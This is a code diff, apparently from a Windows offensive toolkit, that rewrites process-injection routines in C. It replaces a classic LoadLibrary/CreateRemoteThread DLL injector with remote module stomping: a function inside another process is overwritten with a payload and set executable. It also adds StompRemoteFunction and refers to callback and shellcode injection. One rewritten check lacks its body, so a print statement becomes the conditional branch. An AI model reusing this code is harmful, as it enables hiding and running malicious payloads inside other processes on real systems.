@@ -50,6 +50,7 @@ BOOLEAN InjectCallbackPayloadEnumChildWindows
 
 		return TRUE;
 }
+
 BOOLEAN InjectCallbackPayloadEnumDesktops
 (
 	IN     LPVOID  pPayload,
@@ -287,31 +288,35 @@ EndOfFunc:
 }
 
 
-BOOL InjectDll(HANDLE hProcess, LPWSTR DllName)
+BOOL InjectRemoteDll
+(
+	IN     PVOID   pPayload,
+	IN	   HANDLE  hProcess, 
+	IN	   LPSTR   TargetDllName,
+	IN     LPSTR   TargetFunctionName,
+	IN     SIZE_T  sSizeToWrite,
+	   OUT PVOID  *pRemoteFunctionAddress
+)
 {
-	BOOL state = FALSE;
-	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
-	
 	SIZE_T BytesWritten;
-	HANDLE hThread = INVALID_HANDLE_VALUE;
-	LPVOID pLoadLibraryW;
-	LPVOID pAddress = NULL;
 	
-	if (!(pLoadLibraryW = GetProcAddress(LoadLibraryW(L"kernel32.dll"), "LoadLibraryW"))) goto _cleanup;
-			 
-	if (!(pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) goto _cleanup;
-	
-	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &BytesWritten)) goto _cleanup;
-	
-	if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, 0, NULL)) == INVALID_HANDLE_VALUE) goto _cleanup;
+	LPVOID pTargetFunctionAddress;
+	DWORD dwOldProtections = 0;
 
-	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
+	if (!(*pRemoteFunctionAddress = GetProcAddress(LoadLibraryA(TargetDllName), TargetFunctionName))) return FALSE;
 
-	state = TRUE;
-_cleanup:
-	if (pAddress) VirtualFree(pAddress, dwSizeToWrite, MEM_FREE);
-	CloseHandle(hThread);
-	return state;
+	if (!VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_READWRITE, &dwOldProtections)) return FALSE;
+	if (!WriteProcessMemory(hProcess, *pRemoteFunctionAddress, pPayload, sSizeToWrite, &BytesWritten) || sSizeToWrite != BytesWritten)
+	{
+		printf("Failed to write process memory with ErrorCode: 0x%lx", GetLastError());
+		return FALSE;
+	}
+
+	if (!VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_EXECUTE_READWRITE, &dwOldProtections))
+
+	printf("[i] Injected %s to the targeted process! Payload allocated At : 0x%p Of Size : %lu\n", TargetDllName, *pRemoteFunctionAddress, (DWORD)sSizeToWrite);
+
+	return TRUE;
 }
 
 BOOL InjectShellcode(HANDLE hProcess, PBYTE pLocalShellcode, SIZE_T sShellcode)
@@ -345,11 +350,11 @@ _cleanup:
 	return state;
 }
 
-BOOL StompFunction
+BOOL StompLocalFunction
 (
-	IN    PVOID  pTargetFuncAddress,
-	IN	  PUCHAR pPayload,
-	IN    SIZE_T sPayloadSize
+	IN     PVOID  pTargetFuncAddress,
+	IN	   PUCHAR pPayload,
+	IN     SIZE_T sPayloadSize
 )
 {
 
@@ -362,6 +367,32 @@ BOOL StompFunction
 	memcpy(pTargetFuncAddress, pPayload, sPayloadSize);
 
 	if (!VirtualProtect(pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections)) return FALSE;
+
+	return TRUE;
+}  
+
+BOOL StompRemoteFunction
+(
+	IN     PVOID  pTargetFuncAddress,
+	IN     HANDLE hTargetProcess,
+	IN	   PUCHAR pPayload,
+	IN     SIZE_T sPayloadSize
+)
+{
+
+	if (!pTargetFuncAddress || !pPayload || !sPayloadSize) return FALSE;
+
+	DWORD dwOldProtections = 0;
+	SIZE_T sBytesWritten   = 0;
+
+
+	if (!VirtualProtectEx(hTargetProcess, pTargetFuncAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtections)) return FALSE;
+
+	WriteProcessMemory(hTargetProcess, pTargetFuncAddress, pPayload, sPayloadSize, &sBytesWritten);
+
+	if (sPayloadSize != sBytesWritten) return FALSE;
+
+	if (!VirtualProtectEx(hTargetProcess, pTargetFuncAddress, sPayloadSize, dwOldProtections, &dwOldProtections)) return FALSE;
 
 	return TRUE;
 }
